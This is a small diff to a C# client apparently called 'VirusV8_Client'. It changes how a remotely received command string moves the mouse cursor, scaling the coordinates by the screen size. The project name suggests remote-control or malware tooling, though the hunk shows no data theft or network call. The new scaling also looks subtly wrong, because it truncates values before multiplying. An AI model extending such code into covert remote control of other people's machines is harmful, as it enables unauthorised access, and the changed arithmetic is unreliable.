@@ -153,7 +153,7 @@ namespace VirusV8_Client
                         try
                         {
                             string[] mousepositions = something.Split(':');
-                            Cursor.Position = new Point(Convert.ToInt32(mousepositions[1]), Convert.ToInt32(mousepositions[2]));
+                            Cursor.Position = new Point(Convert.ToInt32(mousepositions[1]) * Screen.PrimaryScreen.Bounds.Width, Convert.ToInt32(mousepositions[2]) * Screen.PrimaryScreen.Bounds.Height);
                         }
                         catch
                         {
